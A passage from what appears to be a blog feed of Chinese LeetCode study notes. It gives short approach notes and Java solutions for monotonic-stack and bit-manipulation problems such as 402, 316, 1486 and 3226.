&#125;</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        stack.clear();</span><br><span class="line">        <span class="type">long</span> <span class="variable">res1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> i == n ? Integer.MAX_VALUE : nums[i];</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty()&amp;&amp; x &gt;= nums[stack.peek()])&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> i;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!stack.isEmpty())&#123;</span><br><span class="line">                    left = stack.peek();</span><br><span class="line">                &#125;</span><br><span class="line">                res1 += (<span class="type">long</span>) (right - index) * (index - left) * nums[index];</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">return</span> res1 - res2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="最小字典序"><a href="#最小字典序" class="headerlink" title="最小字典序"></a>最小字典序</h1><h3 id="402-移掉-K-位数字"><a href="#402-移掉-K-位数字" class="headerlink" title="402. 移掉 K 位数字"></a><a href="https://leetcode.cn/problems/remove-k-digits/">402. 移掉 K 位数字</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前数字大于前面数字字典序 移除当前数字</span><br><span class="line">单调栈</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">removeKdigits</span><span class="params">(String num, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        Deque&lt;Character&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> num.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (k &gt; <span class="number">0</span> &amp;&amp; !deque.isEmpty() &amp;&amp; num.charAt(i) &lt; deque.peek()) &#123;</span><br><span class="line">                k--;</span><br><span class="line">                deque.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.push(num.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            deque.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sb.length() == <span class="number">0</span> &amp;&amp; deque.peekLast() == <span class="string">&#x27;0&#x27;</span>) deque.removeLast();</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                sb.append(deque.pollLast());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.length() == <span class="number">0</span> ? <span class="string">&quot;0&quot;</span> : sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1673-找出最具竞争力的子序列"><a href="#1673-找出最具竞争力的子序列" class="headerlink" title="1673. 找出最具竞争力的子序列"></a><a href="https://leetcode.cn/problems/find-the-most-competitive-subsequence/">1673. 找出最具竞争力的子序列</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也就是数字尽量小。单调栈即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] mostCompetitive(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        k = n - k;</span><br><span class="line">        Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (k &gt; <span class="number">0</span> &amp;&amp; !deque.isEmpty() &amp;&amp; nums[i] &lt; deque.peek()) &#123;</span><br><span class="line">                deque.pop();</span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            deque.push(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            deque.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[deque.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty()) &#123;</span><br><span class="line">            res[i] = deque.pollLast();</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="316-去除重复字母"><a href="#316-去除重复字母" class="headerlink" title="316. 去除重复字母"></a><a href="https://leetcode.cn/problems/remove-duplicate-letters/">316. 去除重复字母</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跟之前题很像，但唯一。因此需要判断某字符是否被使用（需要使用visited）判断，并且在移除字母时需要判断移除当前字母后是否还有对应得字母（避免某一字符没出现，需要使用hashmap）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">removeDuplicateLetters</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        HashMap&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            map.merge(s.charAt(i), <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span>[] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">26</span>];</span><br><span class="line">        Deque&lt;Character&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[s.charAt(i)-<span class="string">&#x27;a&#x27;</span>])&#123;</span><br><span class="line">                <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; map.get(deque.peek()) &gt; <span class="number">0</span> &amp;&amp; s.charAt(i) &lt; deque.peek()) &#123;</span><br><span class="line">                    visited[deque.peek() - <span class="string">&#x27;a&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">                    deque.pop();</span><br><span class="line">                &#125;</span><br><span class="line">                deque.push(s.charAt(i));</span><br><span class="line">                visited[s.charAt(i) - <span class="string">&#x27;a&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            map.merge(s.charAt(i), -<span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty())&#123;</span><br><span class="line">            sb.append(deque.pollLast());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="221021天池-03-整理书架"><a href="#221021天池-03-整理书架" class="headerlink" title="221021天池-03. 整理书架"></a>221021天池-03. 整理书架</h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单调栈+ 两个哈希表维护剩余个数和使用个数</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] arrangeBookshelf(<span class="type">int</span>[] order, <span class="type">int</span> limit) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; leftRecord = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; order.length; i++) &#123;</span><br><span class="line">            leftRecord.merge(order[i], <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; useRecord = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; order.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (useRecord.getOrDefault(order[i], <span class="number">0</span>) &lt; limit) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; leftRecord.get(deque.peek()) + useRecord.get(deque.peek()) &gt; limit &amp;&amp; order[i] &lt; deque.peek()) &#123;</span><br><span class="line">                    useRecord.merge(deque.peek(), -<span class="number">1</span>, Integer::sum);</span><br><span class="line">                    deque.pop();</span><br><span class="line">                &#125;</span><br><span class="line">                useRecord.merge(order[i], <span class="number">1</span>, Integer::sum);</span><br><span class="line">                deque.push(order[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            leftRecord.merge(order[i], -<span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> deque.size();</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty()) &#123;</span><br><span class="line">            res[i] = deque.pollLast();</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_位运算</title>
    <url>/2024/08/09/leetcode-%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/circle/discuss/dHn9Vk/">分享丨【题单】位运算（基础&#x2F;性质&#x2F;拆位&#x2F;试填&#x2F;恒等式&#x2F;思维） - 力扣（LeetCode）</a></p>
<p><a href="https://leetcode.cn/circle/discuss/CaOJ45/">分享｜从集合论到位运算，常见位运算技巧分类总结！ - 力扣（LeetCode）</a></p>
<span id="more"></span>

<p>[toc]</p>
<h2 id="基础题"><a href="#基础题" class="headerlink" title="基础题"></a>基础题</h2><h3 id="1486-数组异或操作"><a href="#1486-数组异或操作" class="headerlink" title="1486. 数组异或操作"></a><a href="https://leetcode.cn/problems/xor-operation-in-an-array/">1486. 数组异或操作</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">xorOperation</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        res ^= (start + i * <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还能够通过数学简化</p>
<p><a href="https://leetcode.cn/problems/xor-operation-in-an-array/solutions/371258/shu-zu-yi-huo-cao-zuo-by-leetcode-solution/">1486. 数组异或操作题解</a></p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">xorOperation</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> start &amp; <span class="number">1</span> &amp; n;</span><br><span class="line">        <span class="keyword">return</span> (xorN(n + start / <span class="number">2</span> - <span class="number">1</span>) ^ xorN(start / <span class="number">2</span> - <span class="number">1</span>)) * <span class="number">2</span> + c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">xorN</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">0</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">4</span> == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span> + n;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2595-奇偶位数"><a href="#2595-奇偶位数" class="headerlink" title="2595. 奇偶位数"></a><a href="https://leetcode.cn/problems/number-of-even-and-odd-bits/">2595. 奇偶位数</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] evenOddBit(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">even</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">odd</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> <span class="number">0x5555</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">evenNum</span> <span class="operator">=</span> n &amp; mask;</span><br><span class="line">        <span class="keyword">while</span> (evenNum &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            even++;</span><br><span class="line">            evenNum &amp;= evenNum -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">oddNum</span> <span class="operator">=</span> (n&gt;&gt;<span class="number">1</span>) &amp; mask;</span><br><span class="line">        <span class="keyword">while</span> (oddNum &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            odd++;</span><br><span class="line">            oddNum &amp;= oddNum -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;even, odd&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="476-数字的补数"><a href="#476-数字的补数" class="headerlink" title="476. 数字的补数"></a><a href="https://leetcode.cn/problems/number-complement/">476. 数字的补数</a></h3><p>思路一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模拟</span><br><span class="line">先获取最高位，然后位运算即可</span><br></pre></td></tr></table></figure>

<p>代码一</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findComplement</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxNum</span> <span class="operator">=</span> (<span class="type">int</span>) Math.pow(<span class="number">2</span>, <span class="number">30</span>);</span><br><span class="line">        <span class="keyword">while</span> (maxNum &gt; num) &#123;</span><br><span class="line">            maxNum &gt;&gt;=  <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ~num &amp; (maxNum - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码二</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findComplement</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxNum</span> <span class="operator">=</span> num;</span><br><span class="line">        <span class="keyword">for</span> (; (maxNum &amp; (maxNum - <span class="number">1</span>)) != <span class="number">0</span>; maxNum &amp;= (maxNum - <span class="number">1</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ~num &amp; (maxNum - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3226-使两个整数相等的位更改次数"><a href="#3226-使两个整数相等的位更改次数" class="headerlink" title="3226. 使两个整数相等的位更改次数"></a><a href="https://leetcode.cn/problems/number-of-bit-changes-to-make-two-integers-equal/">3226. 使两个整数相等的位更改次数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先异或获取差别，再看n那边对应是否有0的，有就返回-1，没有就计数</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minChanges</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">diff</span> <span class="operator">=</span> n ^ k;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (diff != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> diff - (diff &amp; (diff - <span class="number">1</span>));</span><br><span class="line">            diff &amp;= (diff - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ((cur &amp; n) == <span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更简洁的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minChanges</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (n &amp; k) != k ? -<span class="number">1</span> : Integer.bitCount(n ^ k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1356-根据数字二进制下-1-的数目排序"><a href="#1356-根据数字二进制下-1-的数目排序" class="headerlink" title="1356. 根据数字二进制下 1 的数目排序"></a><a href="https://leetcode.cn/problems/sort-integers-by-the-number-of-1-bits/">1356. 根据数字二进制下 1 的数目排序</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortByBits(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        Integer[] integerArr = Arrays.stream(arr).boxed().toArray(Integer[]::<span class="keyword">new</span>);</span><br><span class="line">        Arrays.sort(integerArr,(a, b) -&gt; &#123;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">countA</span> <span class="operator">=</span> Integer.bitCount(a);</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">countB</span> <span class="operator">=</span> Integer.bitCount(b);</span><br><span class="line">            <span class="keyword">if</span> (countA == countB) &#123;</span><br><span class="line">                <span class="keyword">return</span> a.compareTo(b);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> countA.compareTo(countB);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> Arrays.stream(integerArr).mapToInt(k -&gt; k).toArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2220-转换数字的最少位翻转次数"><a href="#2220-转换数字的最少位翻转次数" class="headerlink" title="2220. 转换数字的最少位翻转次数"></a><a href="https://leetcode.cn/problems/minimum-bit-flips-to-convert-number/">2220. 转换数字的最少位翻转次数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也就是求位数不同的个数。异或后求位数即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int minBitFlips(int start, int goal) &#123;</span><br><span class="line">        return Integer.bitCount(start ^ goal);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="868-二进制间距"><a href="#868-二进制间距" class="headerlink" title="868. 二进制间距"></a><a href="https://leetcode.cn/problems/binary-gap/">868. 二进制间距</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模拟即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">binaryGap</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">prev</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i &lt;&lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">if</span>((i &amp; n) != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                    res = Integer.max(res, count - prev);</span><br><span class="line">                &#125;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                prev = count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3211-生成不含相邻零的二进制字符串"><a href="#3211-生成不含相邻零的二进制字符串" class="headerlink" title="3211. 生成不含相邻零的二进制字符串"></a><a href="https://leetcode.cn/problems/generate-binary-strings-without-adjacent-zeros/">3211. 生成不含相邻零的二进制字符串</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其实跟位运算关系不大这题。这题应该是dfs，然后看看减枝方面能优化下不</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">validStrings</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(res, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, n);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(List&lt;String&gt; res, String prev, <span class="type">int</span> i, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == n) &#123;</span><br><span class="line">            res.add(prev);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(res, prev + <span class="string">&quot;1&quot;</span>, i + <span class="number">1</span>, n);</span><br><span class="line">        <span class="keyword">if</span> (prev.isEmpty() || prev.charAt(prev.length() - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">            dfs(res, prev + <span class="string">&quot;0&quot;</span>, i + <span class="number">1</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其它解法思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">位运算</span><br><span class="line">枚举数字，然后通过位运算判断是否满足条件</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public List&lt;String&gt; validStrings(int n) &#123;</span><br><span class="line">        List&lt;String&gt; res = new ArrayList&lt;&gt;();</span><br><span class="line">        int mask = (1 &lt;&lt; n) - 1;</span><br><span class="line">        for (int i = 0; i &lt; (1 &lt;&lt; n); i++) &#123;</span><br><span class="line">            int rev = (~i) &amp; mask;</span><br><span class="line">            if ((rev &amp; (rev &gt;&gt; 1)) == 0) &#123;</span><br><span class="line">                res.add(Integer.toBinaryString((1 &lt;&lt; n) | i).substring(1));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>一般来说有两种取反方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一种是直接异或然后和对应mask</span><br><span class="line">一种是取反然后和对应mask</span><br></pre></td></tr></table></figure>

<h3 id="2917-找出数组中的-K-or-值"><a href="#2917-找出数组中的-K-or-值" class="headerlink" title="2917. 找出数组中的 K-or 值"></a><a href="https://leetcode.cn/problems/find-the-k-or-of-an-array/">2917. 找出数组中的 K-or 值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直接逐位遍历即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findKOr</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">INT_MAX</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> x : nums) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((x &amp; (<span class="number">1</span> &lt;&lt; i)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(count &gt;= k) res |= (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span 